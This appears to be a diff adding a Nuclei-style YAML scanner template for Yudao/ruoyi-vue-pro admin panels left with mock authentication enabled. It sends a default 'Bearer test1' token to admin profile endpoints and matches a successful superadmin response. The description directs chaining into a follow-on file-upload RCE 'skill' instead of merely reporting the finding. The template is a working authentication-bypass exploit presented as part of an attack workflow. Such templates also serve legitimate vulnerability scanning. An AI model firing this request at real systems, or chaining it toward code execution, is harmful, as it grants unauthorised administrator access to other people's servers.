@@ -1,0 +1,46 @@
+id: yudao-mock-token-admin
+
+info:
+  name: 芋道 yudao.security.mock-enable 伪造成超管
+  author: survey-engine
+  severity: critical
+  description: >
+    检测芋道 / ruoyi-vue-pro 管理端生产开启 mock-enable 时，
+    Authorization: Bearer test1（默认 mock-secret=test + userId=1）即可读超管 profile。
+    命中后切 Skill yudao-daifu-mock-file-rce，不要只报登录页。
+  tags: yudao,ruoyi,admin,mock-token,auth-bypass
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin-api/system/user/profile/get"
+      - "{{BaseURL}}/api/admin-api/system/user/profile/get"
+
+    headers:
+      Authorization: "Bearer test1"
+      tenant-id: "1"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"username"'
+          - '"id"'
+        condition: and
+      - type: word
+        part: body
+        words:
+          - '"code":0'
+          - '"code": 0'
+        condition: or
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "账号未登录"
+          - "未登录"
+          - "认证失败"
